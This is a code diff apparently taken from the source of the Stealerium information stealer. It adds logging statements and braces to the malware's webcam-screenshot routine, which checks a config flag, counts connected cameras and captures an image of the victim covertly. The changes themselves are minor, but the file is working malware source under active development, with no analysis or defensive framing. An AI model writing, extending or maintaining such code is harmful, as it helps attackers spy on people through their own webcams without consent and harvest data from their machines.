@@ -49,8 +49,12 @@ namespace Stealerium.Target.System
         {
             // If webcam disabled => skip
             if (Config.WebcamScreenshot != "1")
+            {
+                Logging.Log("WebcamScreenshot is Disabled!");
                 return false;
+            }
 
+            Logging.Log("WebcamScreenshot Started!");
             // If connected one camera
             var count = GetConnectedCamerasCount();
             if (count != 1)
@@ -81,12 +85,13 @@ namespace Stealerium.Target.System
                 }
 
                 Counter.WebcamScreenshot = true;
+                Logging.Log("WebcamScreenshot is Ended!");
             }
             catch (Exception ex)
             {
                 return Logging.Log("WebcamScreenshot : Camera screenshot failed.\n" + ex, false);
             }
-
+            
             return true;
         }
     }
